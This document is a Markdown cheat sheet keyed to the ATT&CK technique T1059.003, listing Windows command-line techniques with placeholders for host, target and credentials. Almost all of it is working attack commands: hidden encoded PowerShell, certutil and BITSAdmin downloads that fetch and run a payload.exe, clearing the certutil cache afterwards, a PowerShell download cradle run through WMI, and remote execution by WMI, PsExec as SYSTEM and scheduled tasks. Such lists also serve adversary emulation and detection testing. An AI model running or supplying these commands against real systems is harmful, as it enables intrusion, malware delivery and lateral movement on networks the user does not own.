# T1059.003 - Windows Command Shell (tooling)

Related ATT&CK context: remote execution and file-transfer examples also map to
WMI, scheduled tasks, remote services, ingress tool transfer, and PsExec-style
service execution.

## Direct cmd.exe

```batch
:: Prepare output/download directory used by the examples below
cmd /c "if not exist C:\temp mkdir C:\temp"

:: Execute command and exit
cmd /c whoami

:: Execute command and stay open
cmd /k whoami

:: Execute encoded command via PowerShell invocation
cmd /c "powershell -nop -w hidden -enc <base64>"

:: Download and execute via certutil (LOLBIN)
cmd /c "certutil -urlcache -split -f http://<host>/payload.exe C:\temp\payload.exe && C:\temp\payload.exe"

:: Clean certutil URL cache after download
cmd /c "certutil -urlcache http://<host>/payload.exe delete"
```

## WMI (remote execution)

```batch
:: Execute command remotely via WMI
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd /c whoami > C:\temp\out.txt"

:: Remote download and execute via WMI + certutil
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd /c certutil -urlcache -split -f http://<host>/payload.exe C:\temp\payload.exe && C:\temp\payload.exe"

:: Remote PowerShell via WMI
wmic /node:<target> /user:<user> /password:<pass> process call create "powershell -nop -exec bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://<host>/payload.ps1')"""
```

## PsExec (remote execution)

```batch
:: Execute command on remote system
PsExec.exe \\<target> -u <user> -p <pass> cmd /c whoami

:: Execute interactively
PsExec.exe \\<target> -u <user> -p <pass> -i cmd

:: Execute as SYSTEM
PsExec.exe \\<target> -s cmd /c whoami
```

## Scheduled Task (remote execution via cmd)

```batch
:: Create and run scheduled task
schtasks /create /s <target> /u <user> /p <pass> /tn "TaskName" /tr "cmd /c whoami" /sc once /st 00:00 /f
schtasks /run /s <target> /u <user> /p <pass> /tn "TaskName"
schtasks /delete /s <target> /u <user> /p <pass> /tn "TaskName" /f
```

## BITSAdmin (file transfer)

```batch
:: Download file via BITS in cmd
bitsadmin /transfer jobname /download /priority normal http://<host>/payload.exe C:\temp\payload.exe
```
